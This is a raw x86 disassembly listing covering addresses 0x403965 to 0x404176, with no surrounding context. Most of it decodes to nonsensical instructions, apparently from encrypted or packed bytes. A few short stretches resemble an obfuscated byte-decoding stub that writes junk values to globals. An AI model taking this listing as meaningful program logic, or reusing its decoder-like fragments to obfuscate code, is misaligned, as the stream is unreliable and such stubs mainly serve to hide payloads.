  403965:	shl    eax,0xa1
  403968:	dec    esi
  403969:	sti    
  40396a:	sub    al,0xaa
  40396c:	jmp    DWORD PTR [edx-0x680e6f26]
  403972:	mov    esp,0xb7c75c9c
  403977:	jo     0x403945
  403979:	test   cl,dl
  40397b:	fsubr  st(6),st
  40397d:	dec    esi
  40397e:	add    al,0x39
  403980:	jae    0x4039c6
  403982:	in     eax,dx
  403983:	loop   0x403950
  403985:	fnstsw WORD PTR [esi]
  403987:	fs ja  0x4039d5
  40398a:	shl    DWORD PTR [edx+0x6b050f8e],1
  403990:	push   edi
  403991:	pop    eax
  403992:	sub    DWORD PTR [ebx],esp
  403994:	iret   
  403995:	mov    bh,0x15
  403997:	jb     0x403a10
  403999:	icebp  
  40399a:	sbb    al,0x3b
  40399c:	inc    eax
  40399d:	push   edx
  40399e:	cmp    al,BYTE PTR [ecx]
  4039a0:	int3   
  4039a1:	mov    bl,0x2f
  4039a3:	mov    bh,dl
  4039a5:	inc    edx
  4039a6:	sub    edx,DWORD PTR [ecx+0x2fc3eb43]
  4039ac:	(bad)  
  4039ad:	repz sbb BYTE PTR [edx],ch
  4039b0:	jl     0x403975
  4039b2:	or     edi,DWORD PTR [ebx+edx*1-0x3c]
  4039b6:	mov    ch,0xec
  4039b8:	lock ss nop
  4039bb:	arpl   WORD PTR [ebp+0x16],sp
  4039be:	movq   QWORD PTR [ecx],mm6
  4039c1:	adc    BYTE PTR [esi],0xe1
  4039c4:	pop    ebx
  4039c5:	push   esp
  4039c6:	sahf   
  4039c7:	lock in al,0x8f
  4039ca:	repz loop 0x403a44
  4039cd:	cmp    al,0xe8
  4039cf:	sar    DWORD PTR ds:0x3b9cc1d9,1
  4039d5:	xlat   BYTE PTR ds:[ebx]
  4039d6:	rcl    BYTE PTR [edi+0x8],1
  4039d9:	push   edi
  4039da:	sbb    edi,eax
  4039dc:	data16 mov ch,0x9d
  4039df:	mov    al,0xa1
  4039e1:	mov    dl,al
  4039e3:	(bad)  
  4039e4:	loopne 0x403971
  4039e6:	pop    ecx
  4039e7:	sbb    esp,DWORD PTR [eax]
  4039e9:	mov    ch,0xe2
  4039eb:	mov    edx,0xc2a67217
  4039f0:	shl    BYTE PTR [ebx+0x7c4bcd99],1
  4039f6:	pop    ebp
  4039f7:	fucomi st,st(5)
  4039f9:	sti    
  4039fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4039fb:	aam    0x79
  4039fd:	(bad)  [edx]
  4039ff:	jle    0x4039dd
  403a01:	xchg   esp,eax
  403a02:	pop    ecx
  403a03:	bound  ecx,QWORD PTR [esi-0x54c1de04]
  403a09:	dec    ebp
  403a0a:	cld    
  403a0b:	push   0xe9e594fd
  403a10:	sbb    eax,0x463dc2df
  403a15:	pop    edi
  403a16:	sbb    eax,0x31779581
  403a1b:	add    edx,DWORD PTR [eax-0x1dd483e1]
  403a21:	add    dl,BYTE PTR [edi+eiz*8+0x7e]
  403a25:	ficom  DWORD PTR ss:[ebx-0x1a33b852]
  403a2c:	jno    0x403a85
  403a2e:	ret    
  403a2f:	push   ecx
  403a30:	pop    edx
  403a31:	push   ss
  403a32:	mov    bl,BYTE PTR [ebp-0x209509f0]
  403a38:	cmp    al,0xe8
  403a3a:	fs (bad) 
  403a3d:	cmc    
  403a3e:	cmp    DWORD PTR [ebx-0x2a],0xffffff91
  403a42:	scas   al,BYTE PTR es:[edi]
  403a43:	xor    BYTE PTR [esp+ebx*1-0x71a7e642],al
  403a4a:	sub    al,0xde
  403a4c:	xor    bl,ah
  403a4e:	mov    edx,0xed7d8570
  403a53:	es xchg edx,eax
  403a55:	sbb    ecx,DWORD PTR [ecx]
  403a57:	jo     0x403aa9
  403a59:	adc    al,BYTE PTR [ecx+0x4a]
  403a5c:	push   es
  403a5d:	fcmovbe st,st(1)
  403a5f:	mov    gs,WORD PTR [edx]
  403a61:	pop    edx
  403a62:	fstp   DWORD PTR [edx]
  403a64:	cmp    BYTE PTR [esi],al
  403a66:	sti    
  403a67:	hlt    
  403a68:	sti    
  403a69:	pop    ebp
  403a6a:	std    
  403a6b:	pop    ecx
  403a6c:	dec    esi
  403a6d:	jle    0x403a80
  403a6f:	shl    DWORD PTR [edx],1
  403a71:	and    dl,BYTE PTR [esi]
  403a73:	rcr    BYTE PTR fs:[edx-0x67ce371b],0x3d
  403a7b:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  403a7d:	out    0x79,al
  403a7f:	xchg   ebp,eax
  403a80:	dec    ebx
  403a81:	pusha  
  403a82:	mov    edi,0x3196c737
  403a87:	stc    
  403a88:	pop    esi
  403a89:	dec    ebp
  403a8a:	arpl   WORD PTR [ebp+0x13],sp
  403a8d:	jno    0x403af2
  403a8f:	loop   0x403aaf
  403a91:	add    al,0x98
  403a93:	mov    cl,0xe7
  403a95:	fs mov dh,0x87
  403a98:	cmc    
  403a99:	cwde   
  403a9a:	mov    edx,DWORD PTR [eax-0x64]
  403a9d:	nop
  403a9e:	pop    edi
  403a9f:	jmp    0x7445:0x86451e14
  403aa6:	and    ebp,DWORD PTR [esi+0x7e]
  403aa9:	xchg   edi,eax
  403aaa:	imul   eax,DWORD PTR [ecx],0x25a25793
  403ab0:	inc    ebx
  403ab1:	fsub   DWORD PTR [esi+esi*1]
  403ab4:	cmc    
  403ab5:	and    dl,BYTE PTR [eax-0x194b36f0]
  403abb:	lods   eax,DWORD PTR ds:[esi]
  403abc:	aas    
  403abd:	ret    
  403abe:	outs   dx,BYTE PTR ds:[esi]
  403abf:	fadd   QWORD PTR [eax-0x71]
  403ac2:	sbb    al,0x55
  403ac4:	inc    edx
  403ac5:	dec    edx
  403ac6:	pop    esp
  403ac7:	sub    BYTE PTR es:[esi-0x45],ah
  403acb:	ins    DWORD PTR es:[edi],dx
  403acc:	push   0xffffffea
  403ace:	aas    
  403acf:	xchg   esi,esp
  403ad1:	mov    edi,0xed193df1
  403ad6:	scas   al,BYTE PTR es:[edi]
  403ad7:	push   cs
  403ad8:	mov    esi,0xfa666fac
  403add:	ins    BYTE PTR es:[edi],dx
  403ade:	jmp    0x46026936
  403ae3:	(bad)  
  403ae4:	sub    BYTE PTR [edx+0x387bc4c6],dh
  403aea:	sub    eax,0x12ba1193
  403aef:	xlat   BYTE PTR ds:[ebx]
  403af0:	mov    al,BYTE PTR [ebp-0x1]
  403af3:	movzx  ecx,WORD PTR ds:0x42e6eb
  403afa:	adc    DWORD PTR ds:0x42fd76,ecx
  403b00:	mov    ecx,DWORD PTR [ebp-0x10]
  403b03:	sub    DWORD PTR ds:0x42e124,0x77ef
  403b0d:	xor    al,0x47
  403b0f:	sub    al,0x37
  403b11:	and    DWORD PTR ds:0x42fcfd,0x33b1
  403b1b:	mov    BYTE PTR [ecx],al
  403b1d:	neg    DWORD PTR ds:0x42fcf5
  403b23:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  403b2a:	jmp    0x403e8a
  403b2f:	fist   WORD PTR [esi+0x1]
  403b32:	cdq    
  403b33:	mov    cl,0x69
  403b35:	addr16 push edx
  403b37:	push   esi
  403b38:	and    DWORD PTR [ecx+0x6f9cf397],esi
  403b3e:	arpl   bp,ax
  403b40:	push   ds
  403b41:	jo     0x403bb3
  403b43:	cmp    eax,0x6a70707d
  403b48:	dec    BYTE PTR [ebx]
  403b4a:	jo     0x403b8d
  403b4c:	repz std 
  403b4e:	inc    esp
  403b4f:	aam    0x7b
  403b51:	dec    edx
  403b52:	js     0x403b1a
  403b54:	inc    eax
  403b55:	pop    es
  403b56:	xor    BYTE PTR [edi+0x133f129e],0xdb
  403b5d:	inc    esp
  403b5e:	fisttp QWORD PTR [esi-0x23]
  403b61:	lock dec ebx
  403b63:	aas    
  403b64:	or     eax,0x2df5370b
  403b69:	jns    0x403b99
  403b6b:	add    BYTE PTR [ebx+0x48fe3752],cl
  403b71:	repz xchg ebx,eax
  403b73:	gs cmc 
  403b75:	in     al,0xf4
  403b77:	js     0x403ba9
  403b79:	mov    edi,0x70c0eb7
  403b7e:	xchg   edi,eax
  403b7f:	lods   eax,DWORD PTR ds:[esi]
  403b80:	lods   eax,DWORD PTR ds:[esi]
  403b81:	jno    0x403bf8
  403b83:	and    BYTE PTR [ebp-0x455d381],0xb6
  403b8a:	adc    DWORD PTR [esi+0x7c],0x3543124e
  403b91:	fmul   st,st(0)
  403b93:	inc    esp
  403b94:	in     eax,dx
  403b95:	dec    esp
  403b96:	ds int3 
  403b98:	xor    ecx,DWORD PTR [edi+ecx*2-0x13168831]
  403b9f:	push   ebx
  403ba0:	les    ecx,FWORD PTR [eax+0x610e91b6]
  403ba6:	dec    esi
  403ba7:	mov    dl,0x7e
  403ba9:	(bad)  
  403baa:	jmp    FWORD PTR [eax+0x79]
  403bad:	dec    ecx
  403bae:	jle    0x403bf7
  403bb0:	xchg   esp,eax
  403bb1:	jnp    0x403b98
  403bb3:	ror    cl,cl
  403bb5:	lds    ebp,FWORD PTR [eax-0x23ac5adb]
  403bbb:	or     esp,DWORD PTR [eax]
  403bbd:	loopne 0x403beb
  403bbf:	(bad)  
  403bc0:	mov    gs,WORD PTR ds:0xc2e4a3ac
  403bc6:	int3   
  403bc7:	dec    esp
  403bc8:	mov    ebp,0x3be2fcf1
  403bcd:	mov    ebp,0x83df72d2
  403bd2:	push   edx
  403bd3:	hlt    
  403bd4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403bd5:	call   0x91f7f763
  403bda:	pop    edx
  403bdb:	and    eax,DWORD PTR [esi+0x3a]
  403bde:	push   ebx
  403bdf:	icebp  
  403be0:	popf   
  403be1:	push   ebp
  403be2:	test   al,0xb0
  403be4:	sbb    dh,0x79
  403be7:	(bad)  
  403be8:	aas    
  403be9:	dec    ecx
  403bea:	xchg   edi,eax
  403beb:	aad    0xdf
  403bed:	fcomp  QWORD PTR [esi+0x4f]
  403bf0:	add    ebx,DWORD PTR [ecx]
  403bf2:	repnz pop eax
  403bf4:	mov    dl,0xe2
  403bf6:	in     al,0xb6
  403bf8:	stos   BYTE PTR es:[edi],al
  403bf9:	jbe    0x403b8b
  403bfb:	(bad)  
  403bfc:	cmp    al,0x2b
  403bfe:	call   0x4dc5c353
  403c03:	je     0x403c5c
  403c05:	mov    edi,0x30bf4dd1
  403c0a:	or     eax,0x2c0d9dc0
  403c0f:	jge    0x403c30
  403c11:	inc    ebx
  403c12:	fidivr DWORD PTR ds:0x69d925cc
  403c18:	sar    DWORD PTR [edx+0x3d],0xd2
  403c1c:	fdiv   QWORD PTR [eax-0x7c]
  403c1f:	or     dl,BYTE PTR [edi-0x49]
  403c22:	pop    es
  403c23:	push   cs
  403c24:	mov    bh,0x8
  403c26:	xchg   edx,eax
  403c27:	add    BYTE PTR [ebp+0x6b],ah
  403c2a:	fwait
  403c2b:	xor    DWORD PTR [edi-0x4807d2f8],eax
  403c31:	jle    0x403c24
  403c33:	add    eax,0xbcf2166e
  403c38:	jmp    0xece472f
  403c3d:	push   eax
  403c3e:	sbb    DWORD PTR [esi-0x40],ecx
  403c41:	add    dl,BYTE PTR [ecx-0x5bb92e52]
  403c47:	aaa    
  403c48:	add    eax,0x5ddec40e
  403c4d:	sbb    eax,0x82398398
  403c52:	icebp  
  403c53:	rcr    BYTE PTR ds:0x20231e1b,1
  403c59:	imul   ecx,DWORD PTR [esi+0x6e2fff6d],0xeb8590df
  403c63:	lods   eax,DWORD PTR ds:[esi]
  403c64:	mov    ebx,0xa46bb131
  403c69:	push   ss
  403c6a:	aaa    
  403c6b:	mov    bl,0x22
  403c6d:	je     0x403c43
  403c6f:	cs jl  0x403c34
  403c72:	mov    al,ds:0x3fc3b1c9
  403c77:	gs mov edx,0x483fa145
  403c7d:	scas   eax,DWORD PTR es:[edi]
  403c7e:	pushf  
  403c7f:	imul   ecx,DWORD PTR [ecx+ebx*2-0x2aaf386c],0x4d5cd74e
  403c8a:	test   DWORD PTR [edx+esi*8-0x17],esp
  403c8e:	cmp    al,0xe4
  403c90:	adc    al,0x7b
  403c92:	dec    esi
  403c93:	pop    esp
  403c94:	push   0x3aba5830
  403c99:	cwde   
  403c9a:	mov    esp,0x7ea464af
  403c9f:	sub    edx,DWORD PTR [edi-0x39b346e7]
  403ca5:	loop   0x403d1d
  403ca7:	pop    ebx
  403ca8:	call   0x81636e2e
  403cad:	mov    edx,0xee10f974
  403cb2:	and    esi,DWORD PTR [ebp+0x4a4fa605]
  403cb8:	scas   eax,DWORD PTR es:[edi]
  403cb9:	mov    DWORD PTR [ecx],eax
  403cbb:	popf   
  403cbc:	push   0x23867c4a
  403cc1:	jp     0x403cd6
  403cc3:	in     eax,dx
  403cc4:	pop    ss
  403cc5:	pop    edx
  403cc6:	cli    
  403cc7:	jno    0x403cbc
  403cc9:	test   eax,0xd2b3c6bc
  403cce:	(bad)  
  403cd0:	jp     0x403d08
  403cd2:	ret    0x6104
  403cd5:	or     esi,DWORD PTR ds:0xd4d169d4
  403cdb:	jmp    0x9d8c:0xcb3142b1
  403ce2:	in     eax,dx
  403ce3:	pop    edi
  403ce4:	nop
  403ce5:	enter  0x2aeb,0x1
  403ce9:	mov    ds:0xf5d7ce21,eax
  403cee:	jmp    FWORD PTR [ecx]
  403cf0:	mov    DWORD PTR ds:0x8b79c0ab,ecx
  403cf6:	pushf  
  403cf7:	outs   dx,DWORD PTR ds:[esi]
  403cf8:	dec    edi
  403cf9:	dec    ebx
  403cfa:	fnsave [ebp+0x7b]
  403cfd:	push   es
  403cfe:	cli    
  403cff:	xor    al,0x59
  403d01:	cmp    BYTE PTR es:[edi],0x44
  403d05:	xor    esi,edi
  403d07:	frstpm(287 only) 
  403d09:	sub    ebx,DWORD PTR [eax-0x44]
  403d0c:	cmp    DWORD PTR [esi-0x7a],0xffffffd4
  403d10:	xchg   esi,eax
  403d11:	pop    ebx
  403d12:	mov    al,ds:0x5e847910
  403d17:	sub    DWORD PTR [ebx-0x41],0x4327deff
  403d1e:	jae    0x403ccd
  403d20:	dec    ecx
  403d21:	mov    eax,0x25ab4cf1
  403d26:	mov    WORD PTR [ecx+0x42],es
  403d29:	aas    
  403d2a:	dec    eax
  403d2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403d2c:	sub    dl,ch
  403d2e:	xchg   ecx,eax
  403d2f:	mov    eax,DWORD PTR [edx-0x27d3604f]
  403d35:	mov    ebp,ebx
  403d37:	inc    ebx
  403d38:	out    dx,eax
  403d39:	add    DWORD PTR [edi+0x6f],0x6c
  403d3d:	cdq    
  403d3e:	mov    ds:0xc9a69991,eax
  403d43:	xchg   esi,edi
  403d45:	js     0x403d27
  403d47:	or     eax,0x4dc83948
  403d4c:	mov    al,0x21
  403d4e:	inc    edi
  403d4f:	and    al,0xb0
  403d51:	test   ah,ah
  403d53:	aaa    
  403d54:	test   eax,0xe892b4d9
  403d59:	mov    edi,DWORD PTR [edx-0x41]
  403d5c:	out    0x6f,al
  403d5e:	icebp  
  403d5f:	packsswb mm4,QWORD PTR fs:[ebx]
  403d63:	frstor [esi+0x61]
  403d66:	mov    WORD PTR [eax],?
  403d68:	mov    ebx,0xd7a1e53b
  403d6d:	or     bl,dl
  403d6f:	mov    ?,WORD PTR [ebx-0x44]
  403d72:	out    0x61,eax
  403d74:	pusha  
  403d75:	or     eax,0x7354a16e
  403d7a:	mov    al,ds:0xb6d5290f
  403d7f:	outs   dx,BYTE PTR ds:[esi]
  403d80:	leave  
  403d81:	adc    DWORD PTR [ebp-0x168e3af],ebp
  403d87:	aad    0x23
  403d89:	push   ebx
  403d8a:	jl     0x403d75
  403d8c:	and    al,0x11
  403d8e:	popf   
  403d8f:	add    eax,0x394ebd85
  403d94:	ds int3 
  403d96:	pop    edi
  403d97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d98:	sbb    al,0x8b
  403d9a:	adc    edx,DWORD PTR [esi+eiz*4+0x732d8a4f]
  403da1:	ss loopne 0x403da6
  403da4:	mov    ebp,eax
  403da6:	add    eax,eax
  403da8:	sbb    cl,BYTE PTR [edi+0x51be9fea]
  403dae:	icebp  
  403daf:	push   0x3b195ab4
  403db4:	cld    
  403db5:	loop   0x403d48
  403db7:	ret    0xeaaf
  403dba:	addr16 push ecx
  403dbc:	ret    
  403dbd:	and    DWORD PTR [edx+0x2d62eb80],0xda5e7541
  403dc7:	dec    edx
  403dc8:	pop    eax
  403dc9:	fisttp QWORD PTR [ebp+0x19]
  403dcc:	adc    ecx,DWORD PTR [ebp-0x6]
  403dcf:	sbb    DWORD PTR ds:[edx-0x70f260cc],0x65
  403dd7:	sub    esi,DWORD PTR [edx+0x46]
  403dda:	out    dx,eax
  403ddb:	ret    0x85d1
  403dde:	mov    BYTE PTR [eax],dl
  403de0:	rol    BYTE PTR [esi+0x3f37cc],1
  403de6:	sub    edi,edi
  403de8:	add    esi,DWORD PTR [ecx+0x62508232]
  403dee:	xor    dl,cl
  403df0:	jecxz  0x403e1b
  403df2:	sti    
  403df3:	fnstcw WORD PTR [ebx+0x164d0d5e]
  403df9:	xor    eax,0xcb7ad4fb
  403dfe:	lock or esi,DWORD PTR [ebp+0xb]
  403e02:	fild   DWORD PTR [edi-0x7a]
  403e05:	daa    
  403e06:	ss fwait
  403e08:	pop    edx
  403e09:	ror    DWORD PTR [ebx],1
  403e0b:	out    dx,al
  403e0c:	gs add eax,0x1f608d5d
  403e12:	xor    al,0x17
  403e14:	dec    edx
  403e16:	mov    dl,0xed
  403e18:	mov    esi,0xc565a105
  403e1d:	imul   edi,ebp,0x2d813ef
  403e23:	inc    edi
  403e24:	ins    DWORD PTR es:[edi],dx
  403e25:	jmp    0x403e8f
  403e27:	(bad)  
  403e28:	int    0x9f
  403e2a:	xchg   ebp,eax
  403e2b:	sahf   
  403e2c:	pop    edi
  403e2d:	mov    BYTE PTR [ebp+0x5bdf5921],bh
  403e33:	outs   dx,DWORD PTR ds:[esi]
  403e34:	sbb    eax,0xd0eaa364
  403e39:	inc    esi
  403e3a:	sub    eax,0x97eafbf4
  403e3f:	inc    ebp
  403e40:	cmp    eax,0x8db9894f
  403e45:	mov    ecx,0xf7249518
  403e4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e4b:	sub    eax,0xadea54ac
  403e50:	sub    BYTE PTR [edi-0x7a],bh
  403e53:	sub    al,0xf8
  403e55:	test   DWORD PTR [eax-0x24],edi
  403e58:	pop    ebp
  403e59:	sbb    cl,al
  403e5b:	mov    al,0x10
  403e5d:	pushf  
  403e5e:	rcl    BYTE PTR [esp+edi*8],0xba
  403e62:	addr16 enter 0x2ed0,0x3c
  403e67:	ss das 
  403e69:	lock enter 0x58a5,0xa4
  403e6e:	jo     0x403eb7
  403e70:	sub    esp,DWORD PTR [ebx+0x32]
  403e73:	push   cs
  403e74:	clc    
  403e75:	or     ebx,ebp
  403e77:	test   bl,dh
  403e79:	outs   dx,BYTE PTR ds:[esi]
  403e7a:	jne    0x403efb
  403e7c:	mov    al,ds:0x9ae555c2
  403e81:	inc    ecx
  403e82:	aad    0x23
  403e84:	pusha  
  403e85:	or     edi,DWORD PTR [esp+ebx*1]
  403e88:	cld    
  403e89:	arpl   di,ax
  403e8b:	inc    ebp
  403e8c:	lock xor BYTE PTR [ebp+0x458bf89c],al
  403e93:	clc    
  403e94:	mov    ecx,0x7510855
  403e99:	push   esi
  403e9a:	xor    eax,ecx
  403e9c:	mov    esi,DWORD PTR ds:0x42e11c
  403ea2:	adc    DWORD PTR ds:0x42e70f,esi
  403ea8:	mov    esi,0x32729c
  403ead:	add    eax,esi
  403eaf:	mov    DWORD PTR ds:0x42fd72,0x1a92
  403eb9:	jmp    0x40423a
  403ebe:	mov    dl,BYTE PTR [ebp-0x1]
  403ec1:	mov    DWORD PTR ds:0x42fd05,0x5bb3
  403ecb:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  403ecf:	mov    DWORD PTR ds:0x42e6ef,0x7752
  403ed9:	jmp    0x404239
  403ede:	jge    0x403ed6
  403ee0:	retf   0xf1c4
  403ee3:	in     al,0x15
  403ee5:	icebp  
  403ee6:	ss mov esp,0x3361c35
  403eec:	mov    esp,DWORD PTR [eax+0x70701b82]
  403ef2:	cmp    eax,0xba70707d
  403ef7:	or     esi,DWORD PTR [ecx-0x2e]
  403efa:	dec    edx
  403efb:	dec    edx
  403efc:	or     al,0xf1
  403efe:	mov    eax,ds:0xa9b7cfdb
  403f03:	cmp    eax,0x22239bf8
  403f08:	and    esi,DWORD PTR ds:0xf2b2886
  403f0e:	mov    edx,0x84f148da
  403f13:	sub    DWORD PTR [edi+0x7d],edx
  403f16:	mov    es,WORD PTR [eax]
  403f18:	push   ds
  403f19:	adc    eax,0xa43bd0ee
  403f1e:	xlat   BYTE PTR ds:[ebx]
  403f1f:	in     eax,dx
  403f20:	ja     0x403eb1
  403f22:	mov    ah,0xf1
  403f24:	fcomp  QWORD PTR [edx]
  403f26:	inc    ebp
  403f27:	int3   
  403f28:	xlat   BYTE PTR ds:[ebx]
  403f29:	jnp    0x403ed2
  403f2b:	retf   
  403f2c:	jbe    0x403eb0
  403f2e:	xor    al,0x70
  403f30:	mov    ah,0x36
  403f32:	or     BYTE PTR ds:0x6c9260e6,0x2d
  403f39:	lds    bx,DWORD PTR [esi+ecx*1-0x2a]
  403f3e:	xor    eax,0x6344f156
  403f43:	adc    edi,DWORD PTR [esi]
  403f45:	xor    BYTE PTR [edi-0x12],dl
  403f48:	sbb    cl,BYTE PTR [ebx-0x3b49ff4c]
  403f4e:	(bad)  
  403f4f:	fnstsw WORD PTR [ebp-0x12]
  403f52:	mov    cl,0xb
  403f54:	ror    BYTE PTR [ebx-0x5b3a85c4],0x23
  403f5b:	dec    eax
  403f5c:	sub    BYTE PTR [edx+ebp*4],0x1c
  403f60:	xlat   BYTE PTR ds:[ebx]
  403f61:	pop    edi
  403f62:	mov    al,0xda
  403f64:	rcr    BYTE PTR [edi+0x30],0x44
  403f68:	aaa    
  403f69:	test   DWORD PTR [eax-0x64],ecx
  403f6c:	mov    DWORD PTR [esi],ecx
  403f6e:	mov    ecx,0xb3207f9c
  403f73:	and    ebx,DWORD PTR [ebp-0x45144b2e]
  403f79:	retf   0xf49e
  403f7c:	stos   DWORD PTR es:[edi],eax
  403f7d:	mov    edx,fs
  403f7f:	inc    eax
  403f80:	push   ecx
  403f81:	xlat   BYTE PTR ds:[ebx]
  403f82:	stos   DWORD PTR es:[edi],eax
  403f83:	ret    0x3c8b
  403f86:	shl    esp,1
  403f88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f89:	add    esi,DWORD PTR [esi+0x7c6125cf]
  403f8f:	lea    edi,[ebp+0x686a40a9]
  403f95:	rol    DWORD PTR [edi-0x5d76c1ae],0x2f
  403f9c:	inc    eax
  403f9d:	in     al,0xea
  403f9f:	outs   dx,BYTE PTR ds:[esi]
  403fa0:	add    al,0x8b
  403fa2:	addr16 xchg edx,eax
  403fa4:	cli    
  403fa5:	sahf   
  403fa6:	jge    0x404019
  403fa8:	push   0xffffffa2
  403faa:	out    0xf5,eax
  403fac:	jl     0x403ff4
  403fae:	push   edi
  403faf:	cld    
  403fb0:	mov    al,0xb
  403fb2:	push   cs
  403fb3:	xor    bh,BYTE PTR [ebp-0x56]
  403fb6:	push   edi
  403fb7:	pop    ecx
  403fb8:	xchg   esi,eax
  403fb9:	test   bl,bl
  403fbb:	xchg   edx,eax
  403fbc:	mov    dl,0xa1
  403fbe:	in     eax,0xe4
  403fc0:	not    BYTE PTR [edx-0xd65b022]
  403fc6:	xor    al,0x51
  403fc8:	in     al,dx
  403fc9:	shr    DWORD PTR [eax+0x59],0x78
  403fcd:	pop    es
  403fce:	in     eax,0x3b
  403fd0:	jecxz  0x404012
  403fd2:	shr    DWORD PTR [edx-0x3],cl
  403fd5:	pushf  
  403fd6:	mov    bl,0x57
  403fd8:	cld    
  403fd9:	jmp    0x13eb:0x424c897e
  403fe0:	pop    esi
  403fe1:	iret   
  403fe2:	cmp    al,0x81
  403fe4:	repz push edx
  403fe6:	loopne 0x403fb9
  403fe8:	mov    ds:0x44b53b02,al
  403fed:	les    esi,FWORD PTR [edi+0x52]
  403ff0:	inc    edx
  403ff1:	sar    DWORD PTR gs:[ecx+0x72b06d01],cl
  403ff8:	adc    al,0xa5
  403ffa:	inc    ecx
  403ffb:	jne    0x403fe6
  403ffd:	ret    
  403ffe:	push   cs
  403fff:	cmp    eax,0xdacd0c54
  404004:	hlt    
  404005:	mov    esp,0xa93d08d1
  40400a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40400b:	ret    0xd272
  40400e:	bound  ecx,QWORD PTR [edi-0x1637c387]
  404014:	mov    ?,WORD PTR [eax+0x69]
  404017:	mov    esp,0xfe54f690
  40401c:	push   ds
  40401d:	loope  0x403fe2
  40401f:	xor    BYTE PTR [eax],bl
  404021:	aas    
  404022:	mov    eax,0xd9294458
  404027:	pop    edx
  404028:	dec    esp
  404029:	pusha  
  40402a:	pusha  
  40402b:	mov    dh,0x67
  40402d:	pop    esi
  40402e:	sub    ch,BYTE PTR [ebx]
  404030:	dec    edx
  404031:	push   esp
  404032:	sub    esp,DWORD PTR [ebx-0x3f07dfa3]
  404038:	and    eax,0x2440426d
  40403d:	(bad)  
  40403e:	(bad)  
  40403f:	push   ecx
  404040:	pop    ss
  404041:	(bad)  
  404042:	ds leave 
  404044:	push   esi
  404045:	loope  0x404014
  404047:	ret    0x44a0
  40404a:	nop
  40404b:	mul    ecx
  40404d:	(bad)  
  40404f:	add    cl,BYTE PTR [edx]
  404051:	xor    DWORD PTR [ecx+0x4eda6048],esp
  404057:	imul   esp,DWORD PTR [edi],0xcc638b7b
  40405d:	call   0x47c5:0x3ba22023
  404064:	xchg   esp,eax
  404065:	lock scas eax,DWORD PTR es:[edi]
  404067:	or     eax,0x6fc76b95
  40406c:	sub    eax,0x57b0bfdb
  404071:	push   ebp
  404072:	mov    dl,0x52
  404074:	xchg   edx,eax
  404075:	scas   eax,DWORD PTR es:[edi]
  404076:	xchg   ebx,eax
  404077:	jl     0x404002
  404079:	test   eax,0x6690b7e0
  40407e:	pushf  
  40407f:	gs out dx,al
  404081:	movhlps xmm1,xmm1
  404084:	adc    DWORD PTR [edx-0x5149986b],ebp
  40408a:	(bad)  
  40408b:	sbb    edx,DWORD PTR [ebp-0x54]
  40408e:	shl    BYTE PTR [ebp+0x2282c152],cl
  404094:	mov    esp,0x92154270
  404099:	(bad)  
  40409a:	aam    0xc3
  40409c:	inc    ebx
  40409d:	scas   al,BYTE PTR es:[edi]
  40409e:	or     dh,BYTE PTR [edi]
  4040a0:	dec    ebp
  4040a1:	fdiv   DWORD PTR [edi]
  4040a3:	sub    al,0x5f
  4040a5:	pusha  
  4040a6:	xor    eax,0xa3567de1
  4040ab:	arpl   WORD PTR [ecx+esi*4-0x20754e31],bp
  4040b2:	cdq    
  4040b3:	mov    esp,0x98da13b0
  4040b8:	push   edi
  4040b9:	mov    dh,0x75
  4040bb:	outs   dx,DWORD PTR ds:[esi]
  4040bc:	out    0x1f,al
  4040be:	cmp    ch,BYTE PTR [esi+0x736a8417]
  4040c4:	xchg   edi,eax
  4040c5:	push   cs
  4040c6:	add    edi,DWORD PTR [edi-0x1a]
  4040c9:	xchg   esp,eax
  4040ca:	push   cs
  4040cb:	imul   esp,DWORD PTR [edi+0x45],0x79a49acb
  4040d2:	xor    BYTE PTR [ecx],ch
  4040d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4040d5:	sub    BYTE PTR [edx-0x6f],bl
  4040d8:	repnz push ss
  4040da:	or     BYTE PTR [ecx+edi*8-0x6fc74da6],al
  4040e1:	inc    edi
  4040e2:	das    
  4040e3:	scas   al,BYTE PTR es:[edi]
  4040e4:	dec    eax
  4040e5:	cmp    ah,BYTE PTR [ebx+0x1c5e2951]
  4040eb:	xchg   ecx,eax
  4040ec:	cmp    ebp,eax
  4040ee:	test   eax,0x1a5ed2fe
  4040f3:	cld    
  4040f4:	mov    esi,ebp
  4040f6:	mov    esp,0x9bd69438
  4040fb:	jmp    0xc482584a
  404100:	wbinvd 
  404102:	dec    ebp
  404103:	xchg   dh,bh
  404105:	(bad)  
  404106:	cmp    dh,dh
  404108:	add    BYTE PTR [edx+esi*1+0x14],0x85
  40410d:	bound  esi,QWORD PTR ds:0xe052c886
  404113:	pop    esi
  404114:	add    eax,0x3d4676ae
  404119:	bnd call 0x3a6257b6
  40411f:	fst    QWORD PTR [ebx+0x16]
  404122:	mov    eax,0x1c3b933a
  404127:	test   al,0x6c
  404129:	(bad)  
  40412a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40412b:	aaa    
  40412c:	sbb    al,0x26
  40412e:	pop    eax
  40412f:	or     BYTE PTR [edx-0x31fcf3c6],ch
  404135:	mov    esp,ebx
  404137:	pop    ebp
  404138:	mov    WORD PTR [ebp+0x745ff814],?
  40413e:	fmul   st(7),st
  404140:	inc    esi
  404141:	dec    edx
  404142:	(bad)  [eax-0x15]
  404145:	sub    eax,0xaa3e13c9
  40414a:	pop    ebx
  40414b:	xchg   edi,eax
  40414c:	jmp    0xc61f:0xbaa7847d
  404153:	jae    0x4041c6
  404155:	ins    DWORD PTR es:[edi],dx
  404156:	inc    edi
  404157:	sbb    edi,DWORD PTR [eax+0x5f]
  40415a:	mov    BYTE PTR [edx-0x5a],dl
  40415d:	add    edx,DWORD PTR [esp+eax*4+0x50]
  404161:	stc    
  404162:	ror    DWORD PTR [esi+eax*8+0xec36855],0xcd
  40416a:	out    0x97,al
  40416c:	push   edx
  40416d:	pop    esp
  40416e:	loopne 0x40418e
  404170:	xor    al,0x90
  404172:	or     BYTE PTR ds:[ecx-0x5e],bh
  404176:	int3   
